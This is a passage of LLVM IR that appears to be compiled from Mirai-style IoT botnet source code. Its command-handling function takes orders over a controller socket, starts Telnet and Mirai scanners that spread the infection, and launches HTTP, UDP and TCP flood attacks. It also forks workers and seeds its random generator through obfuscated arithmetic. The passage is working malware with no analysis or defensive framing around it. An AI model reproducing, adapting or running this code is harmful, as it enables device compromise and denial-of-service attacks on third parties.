  br i1 %49, label %50, label %68

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %67

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* %13, align 4
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = call i64 @strlen(i8* %59) #9
  %61 = call i64 @write(i32 %57, i8* %58, i64 %60)
  %62 = load i32, i32* %13, align 4
  %63 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %64 = call i64 @read(i32 %62, i8* %63, i64 1)
  %65 = load i32, i32* %13, align 4
  %66 = call i32 @close(i32 %65)
  br label %67

; <label>:67:                                     ; preds = %56, %50
  br label %45

; <label>:68:                                     ; preds = %45
  call void @exit(i32 0) #12
  unreachable

; <label>:69:                                     ; preds = %31
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %14, align 4
  %72 = sub i32 0, 1
  %73 = sub i32 %71, %72
  %74 = add nsw i32 %71, 1
  store i32 %73, i32* %14, align 4
  br label %27

; <label>:75:                                     ; preds = %27
  ret void
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #9
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %2
  br label %659

; <label>:44:                                     ; preds = %2
  %45 = load i8**, i8*** %4, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.511, i32 0, i32 0)) #9
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %154, label %50

; <label>:50:                                     ; preds = %44
  %51 = load i8**, i8*** %4, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @strcmp(i8* %53, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i32 0, i32 0)) #9
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %117, label %56

; <label>:56:                                     ; preds = %50
  %57 = call i32 @fork() #5
  store i32 %57, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %58 = call i64 @sysconf(i32 84) #5
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %60 = load i32, i32* %7, align 4
  %61 = icmp eq i32 %60, 1
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %56
  store i32 500, i32* %8, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %56
  %64 = load i32, i32* %7, align 4
  %65 = icmp sge i32 %64, 2
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %63
  store i32 1000, i32* %8, align 4
  br label %67

; <label>:67:                                     ; preds = %66, %63
  %68 = load i32, i32* %5, align 4
  %69 = icmp ugt i32 %68, 0
  br i1 %69, label %70, label %72

; <label>:70:                                     ; preds = %67
  %71 = load i32, i32* %5, align 4
  store i32 %71, i32* @scanPid, align 4
  br label %659

; <label>:72:                                     ; preds = %67
  %73 = load i32, i32* %5, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %659

; <label>:76:                                     ; preds = %72
  br label %77

; <label>:77:                                     ; preds = %76
  store i32 0, i32* %6, align 4
  br label %78

; <label>:78:                                     ; preds = %111, %77
  %79 = load i32, i32* %6, align 4
  %80 = load i32, i32* %7, align 4
  %81 = icmp slt i32 %79, %80
  br i1 %81, label %82, label %116

; <label>:82:                                     ; preds = %78
  %83 = call i64 @time(i64* null) #5
  %84 = call i32 @getpid() #5
  %85 = sext i32 %84 to i64
  %86 = xor i64 %83, -1
  %87 = and i64 %85, %86
  %88 = xor i64 %85, -1
  %89 = and i64 %83, %88
  %90 = or i64 %87, %89
  %91 = xor i64 %83, %85
  %92 = call i32 @getppid() #5
  %93 = sext i32 %92 to i64
  %94 = sub i64 0, %90
  %95 = sub i64 0, %93
  %96 = add i64 %94, %95
  %97 = sub i64 0, %96
  %98 = add nsw i64 %90, %93
  %99 = trunc i64 %97 to i32
  call void @srand(i32 %99) #5
  %100 = call i64 @time(i64* null) #5
  %101 = call i32 @getpid() #5
  %102 = sext i32 %101 to i64
  %103 = xor i64 %100, -1
  %104 = and i64 %102, %103
  %105 = xor i64 %102, -1
  %106 = and i64 %100, %105
  %107 = or i64 %104, %106
  %108 = xor i64 %100, %102
  %109 = trunc i64 %107 to i32
  call void @init_rand(i32 %109)
  %110 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %110)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %112 = load i32, i32* %6, align 4
  %113 = sub i32 0, 1
  %114 = sub i32 %112, %113
  %115 = add nsw i32 %112, 1
  store i32 %114, i32* %6, align 4
  br label %78

; <label>:116:                                    ; preds = %78
  br label %117

; <label>:117:                                    ; preds = %116, %50
  %118 = load i8**, i8*** %4, align 8
  %119 = getelementptr inbounds i8*, i8** %118, i64 1
  %120 = load i8*, i8** %119, align 8
  %121 = call i32 @strcmp(i8* %120, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.513, i32 0, i32 0)) #9
  %122 = icmp ne i32 %121, 0
  br i1 %122, label %130, label %123

; <label>:123:                                    ; preds = %117
  %124 = load i32, i32* @scanPid, align 4
  %125 = icmp eq i32 %124, 0
  br i1 %125, label %126, label %127

; <label>:126:                                    ; preds = %123
  br label %659

; <label>:127:                                    ; preds = %123
  %128 = load i32, i32* @scanPid, align 4
  %129 = call i32 @kill(i32 %128, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %130

; <label>:130:                                    ; preds = %127, %117
  %131 = load i8**, i8*** %4, align 8
  %132 = getelementptr inbounds i8*, i8** %131, i64 1
  %133 = load i8*, i8** %132, align 8
  %134 = call i32 @strcmp(i8* %133, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.514, i32 0, i32 0)) #9
  %135 = icmp ne i32 %134, 0
  br i1 %135, label %153, label %136

; <label>:136:                                    ; preds = %130
  %137 = load i8**, i8*** %4, align 8
  %138 = getelementptr inbounds i8*, i8** %137, i64 1
  %139 = load i8*, i8** %138, align 8
  %140 = call i32 @atoi(i8* %139) #9
  store i32 %140, i32* %9, align 4
  %141 = load i8**, i8*** %4, align 8
  %142 = getelementptr inbounds i8*, i8** %141, i64 2
  %143 = load i8*, i8** %142, align 8
  %144 = call i32 @atoi(i8* %143) #9
  store i32 %144, i32* %10, align 4
  %145 = call i32 @listFork()
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %152, label %147

; <label>:147:                                    ; preds = %136
  %148 = load i32, i32* @mainCommSock, align 4
  %149 = call i32 (i32, i8*, ...) @sockprintf(i32 %148, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.515, i32 0, i32 0))
  %150 = load i32, i32* %10, align 4
  %151 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %150, i32 %151)
  call void @_exit(i32 0) #11
  unreachable

; <label>:152:                                    ; preds = %136
  br label %659

; <label>:153:                                    ; preds = %130
  br label %154

; <label>:154:                                    ; preds = %153, %44
  %155 = load i8**, i8*** %4, align 8
  %156 = getelementptr inbounds i8*, i8** %155, i64 0
  %157 = load i8*, i8** %156, align 8
  %158 = call i32 @strcmp(i8* %157, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.516, i32 0, i32 0)) #9
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %267, label %160

; <label>:160:                                    ; preds = %154
  %161 = load i8**, i8*** %4, align 8
  %162 = getelementptr inbounds i8*, i8** %161, i64 1
  %163 = load i8*, i8** %162, align 8
  %164 = call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.512, i32 0, i32 0)) #9
  %165 = icmp ne i32 %164, 0
  br i1 %165, label %230, label %166

; <label>:166:                                    ; preds = %160
  %167 = call i32 @fork() #5
  store i32 %167, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %168 = call i64 @sysconf(i32 84) #5
  %169 = trunc i64 %168 to i32
  store i32 %169, i32* %13, align 4
  store i32 999999, i32* %14, align 4
  %170 = load i32, i32* %13, align 4
  %171 = icmp eq i32 %170, 1
  br i1 %171, label %172, label %173

; <label>:172:                                    ; preds = %166
  store i32 500, i32* %14, align 4
  br label %173

; <label>:173:                                    ; preds = %172, %166
  %174 = load i32, i32* %13, align 4
  %175 = icmp sge i32 %174, 2
  br i1 %175, label %176, label %177

; <label>:176:                                    ; preds = %173
  store i32 1000, i32* %14, align 4
  br label %177

; <label>:177:                                    ; preds = %176, %173
  %178 = load i32, i32* %11, align 4
  %179 = icmp ugt i32 %178, 0
  br i1 %179, label %180, label %182

; <label>:180:                                    ; preds = %177
  %181 = load i32, i32* %11, align 4
  store i32 %181, i32* @scanPid, align 4
  br label %659

; <label>:182:                                    ; preds = %177
  %183 = load i32, i32* %11, align 4
  %184 = icmp eq i32 %183, -1
  br i1 %184, label %185, label %186

; <label>:185:                                    ; preds = %182
  br label %659

; <label>:186:                                    ; preds = %182
  br label %187

; <label>:187:                                    ; preds = %186
  store i32 0, i32* %12, align 4
  br label %188

; <label>:188:                                    ; preds = %224, %187
  %189 = load i32, i32* %12, align 4
  %190 = load i32, i32* %13, align 4
  %191 = icmp slt i32 %189, %190
  br i1 %191, label %192, label %229

; <label>:192:                                    ; preds = %188
  %193 = call i64 @time(i64* null) #5
  %194 = call i32 @getpid() #5
  %195 = sext i32 %194 to i64
  %196 = xor i64 %193, -1
  %197 = and i64 %195, %196
  %198 = xor i64 %195, -1
  %199 = and i64 %193, %198
  %200 = or i64 %197, %199
  %201 = xor i64 %193, %195
  %202 = call i32 @getppid() #5
  %203 = sext i32 %202 to i64
  %204 = sub i64 0, %203
  %205 = sub i64 %200, %204
  %206 = add nsw i64 %200, %203
  %207 = trunc i64 %205 to i32
  call void @srand(i32 %207) #5
  %208 = call i64 @time(i64* null) #5
  %209 = call i32 @getpid() #5
  %210 = sext i32 %209 to i64
  %211 = xor i64 %208, -1
  %212 = and i64 3949782743941120755, %211
  %213 = xor i64 3949782743941120755, -1
  %214 = and i64 %208, %213
  %215 = xor i64 %210, -1
  %216 = and i64 %215, 3949782743941120755
  %217 = and i64 %210, %213
  %218 = or i64 %212, %214
  %219 = or i64 %216, %217
  %220 = xor i64 %218, %219
  %221 = xor i64 %208, %210
  %222 = trunc i64 %220 to i32
  call void @init_rand(i32 %222)
  %223 = load i32, i32* %14, align 4
  call void @MiraiScanner(i32 100, i32 %223)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %225 = load i32, i32* %12, align 4
  %226 = sub i32 0, 1
  %227 = sub i32 %225, %226
  %228 = add nsw i32 %225, 1
  store i32 %227, i32* %12, align 4
  br label %188

; <label>:229:                                    ; preds = %188
  br label %230

; <label>:230:                                    ; preds = %229, %160
  %231 = load i8**, i8*** %4, align 8
  %232 = getelementptr inbounds i8*, i8** %231, i64 1
  %233 = load i8*, i8** %232, align 8
  %234 = call i32 @strcmp(i8* %233, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.513, i32 0, i32 0)) #9
  %235 = icmp ne i32 %234, 0
  br i1 %235, label %243, label %236

; <label>:236:                                    ; preds = %230
  %237 = load i32, i32* @scanPid, align 4
  %238 = icmp eq i32 %237, 0
  br i1 %238, label %239, label %240

; <label>:239:                                    ; preds = %236
  br label %659

; <label>:240:                                    ; preds = %236
  %241 = load i32, i32* @scanPid, align 4
  %242 = call i32 @kill(i32 %241, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %243

; <label>:243:                                    ; preds = %240, %230
  %244 = load i8**, i8*** %4, align 8
  %245 = getelementptr inbounds i8*, i8** %244, i64 1
  %246 = load i8*, i8** %245, align 8
  %247 = call i32 @strcmp(i8* %246, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.514, i32 0, i32 0)) #9
  %248 = icmp ne i32 %247, 0
  br i1 %248, label %266, label %249

; <label>:249:                                    ; preds = %243
  %250 = load i8**, i8*** %4, align 8
  %251 = getelementptr inbounds i8*, i8** %250, i64 1
  %252 = load i8*, i8** %251, align 8
  %253 = call i32 @atoi(i8* %252) #9
  store i32 %253, i32* %15, align 4
  %254 = load i8**, i8*** %4, align 8
  %255 = getelementptr inbounds i8*, i8** %254, i64 2
  %256 = load i8*, i8** %255, align 8
  %257 = call i32 @atoi(i8* %256) #9
  store i32 %257, i32* %16, align 4
  %258 = call i32 @listFork()
  %259 = icmp ne i32 %258, 0
  br i1 %259, label %265, label %260

; <label>:260:                                    ; preds = %249
  %261 = load i32, i32* @mainCommSock, align 4
  %262 = call i32 (i32, i8*, ...) @sockprintf(i32 %261, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.517, i32 0, i32 0))
  %263 = load i32, i32* %16, align 4
  %264 = load i32, i32* %15, align 4
  call void @MiraiScanner(i32 %263, i32 %264)
  call void @_exit(i32 0) #11
  unreachable

; <label>:265:                                    ; preds = %249
  br label %659

; <label>:266:                                    ; preds = %243
  br label %267

; <label>:267:                                    ; preds = %266, %154
  %268 = load i8**, i8*** %4, align 8
  %269 = getelementptr inbounds i8*, i8** %268, i64 0
  %270 = load i8*, i8** %269, align 8
  %271 = call i32 @strcmp(i8* %270, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.518, i32 0, i32 0)) #9
  %272 = icmp ne i32 %271, 0
  br i1 %272, label %316, label %273

; <label>:273:                                    ; preds = %267
  %274 = load i32, i32* %3, align 4
  %275 = icmp slt i32 %274, 6
  br i1 %275, label %288, label %276

; <label>:276:                                    ; preds = %273
  %277 = load i8**, i8*** %4, align 8
  %278 = getelementptr inbounds i8*, i8** %277, i64 3
  %279 = load i8*, i8** %278, align 8
  %280 = call i32 @atoi(i8* %279) #9
  %281 = icmp slt i32 %280, 1
  br i1 %281, label %288, label %282

; <label>:282:                                    ; preds = %276
  %283 = load i8**, i8*** %4, align 8
  %284 = getelementptr inbounds i8*, i8** %283, i64 5
  %285 = load i8*, i8** %284, align 8
  %286 = call i32 @atoi(i8* %285) #9
  %287 = icmp slt i32 %286, 1
  br i1 %287, label %288, label %289

; <label>:288:                                    ; preds = %282, %276, %273
  br label %659

; <label>:289:                                    ; preds = %282
  %290 = call i32 @listFork()
  %291 = icmp ne i32 %290, 0
  br i1 %291, label %292, label %293

; <label>:292:                                    ; preds = %289
  br label %659

; <label>:293:                                    ; preds = %289
  %294 = load i8**, i8*** %4, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 1
  %296 = load i8*, i8** %295, align 8
  %297 = load i8**, i8*** %4, align 8
  %298 = getelementptr inbounds i8*, i8** %297, i64 2
  %299 = load i8*, i8** %298, align 8
  %300 = load i8**, i8*** %4, align 8
  %301 = getelementptr inbounds i8*, i8** %300, i64 3
  %302 = load i8*, i8** %301, align 8
  %303 = call i32 @atoi(i8* %302) #9
  %304 = trunc i32 %303 to i16
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 4
  %307 = load i8*, i8** %306, align 8
  %308 = load i8**, i8*** %4, align 8
  %309 = getelementptr inbounds i8*, i8** %308, i64 5
  %310 = load i8*, i8** %309, align 8
  %311 = call i32 @atoi(i8* %310) #9
  %312 = load i8**, i8*** %4, align 8
  %313 = getelementptr inbounds i8*, i8** %312, i64 6
  %314 = load i8*, i8** %313, align 8
  %315 = call i32 @atoi(i8* %314) #9
  call void @SendHTTP(i8* %296, i8* %299, i16 zeroext %304, i8* %307, i32 %311, i32 %315)
  call void @exit(i32 0) #12
  unreachable

; <label>:316:                                    ; preds = %267
  %317 = load i8**, i8*** %4, align 8
  %318 = getelementptr inbounds i8*, i8** %317, i64 0
  %319 = load i8*, i8** %318, align 8
  %320 = call i32 @strcmp(i8* %319, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.519, i32 0, i32 0)) #9
  %321 = icmp ne i32 %320, 0
  br i1 %321, label %419, label %322

; <label>:322:                                    ; preds = %316
  %323 = load i32, i32* %3, align 4
  %324 = icmp slt i32 %323, 6
  br i1 %324, label %358, label %325

; <label>:325:                                    ; preds = %322
  %326 = load i8**, i8*** %4, align 8
  %327 = getelementptr inbounds i8*, i8** %326, i64 3
  %328 = load i8*, i8** %327, align 8
  %329 = call i32 @atoi(i8* %328) #9
  %330 = icmp eq i32 %329, -1
  br i1 %330, label %358, label %331

; <label>:331:                                    ; preds = %325
  %332 = load i8**, i8*** %4, align 8
  %333 = getelementptr inbounds i8*, i8** %332, i64 2
  %334 = load i8*, i8** %333, align 8
  %335 = call i32 @atoi(i8* %334) #9
  %336 = icmp eq i32 %335, -1
  br i1 %336, label %358, label %337

; <label>:337:                                    ; preds = %331
  %338 = load i8**, i8*** %4, align 8
  %339 = getelementptr inbounds i8*, i8** %338, i64 4
  %340 = load i8*, i8** %339, align 8
  %341 = call i32 @atoi(i8* %340) #9
  %342 = icmp eq i32 %341, -1
  br i1 %342, label %358, label %343

; <label>:343:                                    ; preds = %337
  %344 = load i8**, i8*** %4, align 8
  %345 = getelementptr inbounds i8*, i8** %344, i64 4
  %346 = load i8*, i8** %345, align 8
  %347 = call i32 @atoi(i8* %346) #9
  %348 = icmp sgt i32 %347, 1024
  br i1 %348, label %358, label %349

; <label>:349:                                    ; preds = %343
  %350 = load i32, i32* %3, align 4
  %351 = icmp eq i32 %350, 6
  br i1 %351, label %352, label %359

; <label>:352:                                    ; preds = %349
  %353 = load i8**, i8*** %4, align 8
  %354 = getelementptr inbounds i8*, i8** %353, i64 5
  %355 = load i8*, i8** %354, align 8
  %356 = call i32 @atoi(i8* %355) #9
  %357 = icmp slt i32 %356, 1
  br i1 %357, label %358, label %359

; <label>:358:                                    ; preds = %352, %343, %337, %331, %325, %322
  br label %659

; <label>:359:                                    ; preds = %352, %349
  %360 = load i8**, i8*** %4, align 8
  %361 = getelementptr inbounds i8*, i8** %360, i64 1
  %362 = load i8*, i8** %361, align 8
  store i8* %362, i8** %17, align 8
  %363 = load i8**, i8*** %4, align 8
  %364 = getelementptr inbounds i8*, i8** %363, i64 2
  %365 = load i8*, i8** %364, align 8
  %366 = call i32 @atoi(i8* %365) #9
  store i32 %366, i32* %18, align 4
  %367 = load i8**, i8*** %4, align 8
  %368 = getelementptr inbounds i8*, i8** %367, i64 3
  %369 = load i8*, i8** %368, align 8
  %370 = call i32 @atoi(i8* %369) #9
  store i32 %370, i32* %19, align 4
  %371 = load i8**, i8*** %4, align 8
  %372 = getelementptr inbounds i8*, i8** %371, i64 4
  %373 = load i8*, i8** %372, align 8
  %374 = call i32 @atoi(i8* %373) #9
  store i32 %374, i32* %20, align 4
  %375 = load i32, i32* %3, align 4
  %376 = icmp eq i32 %375, 6
  br i1 %376, label %377, label %382

; <label>:377:                                    ; preds = %359
  %378 = load i8**, i8*** %4, align 8
  %379 = getelementptr inbounds i8*, i8** %378, i64 5
  %380 = load i8*, i8** %379, align 8
  %381 = call i32 @atoi(i8* %380) #9
  br label %383

; <label>:382:                                    ; preds = %359
  br label %383

; <label>:383:                                    ; preds = %382, %377
  %384 = phi i32 [ %381, %377 ], [ 10, %382 ]
  store i32 %384, i32* %21, align 4
  store i32 32, i32* %22, align 4
  %385 = load i8*, i8** %17, align 8
  %386 = call i8* @strstr(i8* %385, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %387 = icmp ne i8* %386, null
  br i1 %387, label %388, label %407

; <label>:388:                                    ; preds = %383
  %389 = load i8*, i8** %17, align 8
  %390 = call i8* @strtok(i8* %389, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %390, i8** %23, align 8
  br label %391

; <label>:391:                                    ; preds = %404, %388
  %392 = load i8*, i8** %23, align 8
  %393 = icmp ne i8* %392, null
  br i1 %393, label %394, label %406

; <label>:394:                                    ; preds = %391
  %395 = call i32 @listFork()
  %396 = icmp ne i32 %395, 0
  br i1 %396, label %404, label %397

; <label>:397:                                    ; preds = %394
  %398 = load i8*, i8** %23, align 8
  %399 = load i32, i32* %18, align 4
  %400 = load i32, i32* %19, align 4
  %401 = load i32, i32* %20, align 4
  %402 = load i32, i32* %21, align 4
  %403 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %398, i32 %399, i32 %400, i32 %401, i32 %402, i32 %403)
  call void @_exit(i32 0) #11
  unreachable

; <label>:404:                                    ; preds = %394
  %405 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %405, i8** %23, align 8
  br label %391

; <label>:406:                                    ; preds = %391
  br label %418

; <label>:407:                                    ; preds = %383
  %408 = call i32 @listFork()
  %409 = icmp ne i32 %408, 0
  br i1 %409, label %410, label %411

; <label>:410:                                    ; preds = %407
  br label %659

; <label>:411:                                    ; preds = %407
  %412 = load i8*, i8** %17, align 8
  %413 = load i32, i32* %18, align 4
  %414 = load i32, i32* %19, align 4
  %415 = load i32, i32* %20, align 4
  %416 = load i32, i32* %21, align 4
  %417 = load i32, i32* %22, align 4
  call void @SendUDP(i8* %412, i32 %413, i32 %414, i32 %415, i32 %416, i32 %417)
  call void @_exit(i32 0) #11
  unreachable

; <label>:418:                                    ; preds = %406
  br label %419

; <label>:419:                                    ; preds = %418, %316
  %420 = load i8**, i8*** %4, align 8
  %421 = getelementptr inbounds i8*, i8** %420, i64 0
  %422 = load i8*, i8** %421, align 8
  %423 = call i32 @strcmp(i8* %422, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.520, i32 0, i32 0)) #9
  %424 = icmp ne i32 %423, 0
  br i1 %424, label %530, label %425

; <label>:425:                                    ; preds = %419
  %426 = load i32, i32* %3, align 4
  %427 = icmp slt i32 %426, 6
  br i1 %427, label %458, label %428

; <label>:428:                                    ; preds = %425
  %429 = load i8**, i8*** %4, align 8
  %430 = getelementptr inbounds i8*, i8** %429, i64 3
  %431 = load i8*, i8** %430, align 8
  %432 = call i32 @atoi(i8* %431) #9
  %433 = icmp eq i32 %432, -1
  br i1 %433, label %458, label %434

; <label>:434:                                    ; preds = %428
  %435 = load i8**, i8*** %4, align 8
  %436 = getelementptr inbounds i8*, i8** %435, i64 2
  %437 = load i8*, i8** %436, align 8
  %438 = call i32 @atoi(i8* %437) #9
  %439 = icmp eq i32 %438, -1
  br i1 %439, label %458, label %440

; <label>:440:                                    ; preds = %434
  %441 = load i32, i32* %3, align 4
  %442 = icmp sgt i32 %441, 5
  br i1 %442, label %443, label %449

; <label>:443:                                    ; preds = %440
  %444 = load i8**, i8*** %4, align 8
  %445 = getelementptr inbounds i8*, i8** %444, i64 5
  %446 = load i8*, i8** %445, align 8
  %447 = call i32 @atoi(i8* %446) #9
  %448 = icmp slt i32 %447, 0
  br i1 %448, label %458, label %449

; <label>:449:                                    ; preds = %443, %440
  %450 = load i32, i32* %3, align 4
  %451 = icmp eq i32 %450, 7
  br i1 %451, label %452, label %459

; <label>:452:                                    ; preds = %449
  %453 = load i8**, i8*** %4, align 8
  %454 = getelementptr inbounds i8*, i8** %453, i64 6
  %455 = load i8*, i8** %454, align 8
  %456 = call i32 @atoi(i8* %455) #9
  %457 = icmp slt i32 %456, 1
  br i1 %457, label %458, label %459

; <label>:458:                                    ; preds = %452, %443, %434, %428, %425
  br label %659

; <label>:459:                                    ; preds = %452, %449
  %460 = load i8**, i8*** %4, align 8
  %461 = getelementptr inbounds i8*, i8** %460, i64 1
  %462 = load i8*, i8** %461, align 8
  store i8* %462, i8** %24, align 8
  %463 = load i8**, i8*** %4, align 8
  %464 = getelementptr inbounds i8*, i8** %463, i64 2
  %465 = load i8*, i8** %464, align 8
  %466 = call i32 @atoi(i8* %465) #9
  store i32 %466, i32* %25, align 4
  %467 = load i8**, i8*** %4, align 8
  %468 = getelementptr inbounds i8*, i8** %467, i64 3
  %469 = load i8*, i8** %468, align 8
  %470 = call i32 @atoi(i8* %469) #9
  store i32 %470, i32* %26, align 4
  %471 = load i8**, i8*** %4, align 8
  %472 = getelementptr inbounds i8*, i8** %471, i64 4
  %473 = load i8*, i8** %472, align 8
  store i8* %473, i8** %27, align 8
  %474 = load i32, i32* %3, align 4
  %475 = icmp eq i32 %474, 7
  br i1 %475, label %476, label %481

; <label>:476:                                    ; preds = %459
  %477 = load i8**, i8*** %4, align 8
  %478 = getelementptr inbounds i8*, i8** %477, i64 6
  %479 = load i8*, i8** %478, align 8
  %480 = call i32 @atoi(i8* %479) #9
  br label %482

; <label>:481:                                    ; preds = %459
  br label %482

; <label>:482:                                    ; preds = %481, %476
  %483 = phi i32 [ %480, %476 ], [ 10, %481 ]
  store i32 %483, i32* %28, align 4
  %484 = load i32, i32* %3, align 4
  %485 = icmp sgt i32 %484, 5
  br i1 %485, label %486, label %491

; <label>:486:                                    ; preds = %482
  %487 = load i8**, i8*** %4, align 8
  %488 = getelementptr inbounds i8*, i8** %487, i64 5
  %489 = load i8*, i8** %488, align 8
  %490 = call i32 @atoi(i8* %489) #9
  br label %492

; <label>:491:                                    ; preds = %482
  br label %492

; <label>:492:                                    ; preds = %491, %486
  %493 = phi i32 [ %490, %486 ], [ 0, %491 ]
  store i32 %493, i32* %29, align 4
  store i32 32, i32* %30, align 4
  %494 = load i8*, i8** %24, align 8
  %495 = call i8* @strstr(i8* %494, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %496 = icmp ne i8* %495, null
  br i1 %496, label %497, label %517

; <label>:497:                                    ; preds = %492
  %498 = load i8*, i8** %24, align 8
  %499 = call i8* @strtok(i8* %498, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %499, i8** %31, align 8
  br label %500

; <label>:500:                                    ; preds = %514, %497
  %501 = load i8*, i8** %31, align 8
  %502 = icmp ne i8* %501, null
  br i1 %502, label %503, label %516

; <label>:503:                                    ; preds = %500
  %504 = call i32 @listFork()
  %505 = icmp ne i32 %504, 0
  br i1 %505, label %514, label %506

; <label>:506:                                    ; preds = %503
  %507 = load i8*, i8** %31, align 8
  %508 = load i32, i32* %25, align 4
  %509 = load i32, i32* %26, align 4
  %510 = load i8*, i8** %27, align 8
  %511 = load i32, i32* %29, align 4
  %512 = load i32, i32* %28, align 4
  %513 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %507, i32 %508, i32 %509, i8* %510, i32 %511, i32 %512, i32 %513)
  call void @_exit(i32 0) #11
  unreachable

; <label>:514:                                    ; preds = %503
  %515 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %515, i8** %31, align 8
  br label %500

; <label>:516:                                    ; preds = %500
  br label %529

; <label>:517:                                    ; preds = %492
  %518 = call i32 @listFork()
  %519 = icmp ne i32 %518, 0
  br i1 %519, label %520, label %521

; <label>:520:                                    ; preds = %517
  br label %659

; <label>:521:                                    ; preds = %517
  %522 = load i8*, i8** %24, align 8
  %523 = load i32, i32* %25, align 4
  %524 = load i32, i32* %26, align 4
  %525 = load i8*, i8** %27, align 8
  %526 = load i32, i32* %29, align 4
  %527 = load i32, i32* %28, align 4
  %528 = load i32, i32* %30, align 4
  call void @SendTCP(i8* %522, i32 %523, i32 %524, i8* %525, i32 %526, i32 %527, i32 %528)
  call void @_exit(i32 0) #11
  unreachable

; <label>:529:                                    ; preds = %516
  br label %530

; <label>:530:                                    ; preds = %529, %419
  %531 = load i8**, i8*** %4, align 8
  %532 = getelementptr inbounds i8*, i8** %531, i64 0
  %533 = load i8*, i8** %532, align 8
  %534 = call i32 @strcmp(i8* %533, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.521, i32 0, i32 0)) #9
  %535 = icmp ne i32 %534, 0
  br i1 %535, label %592, label %536

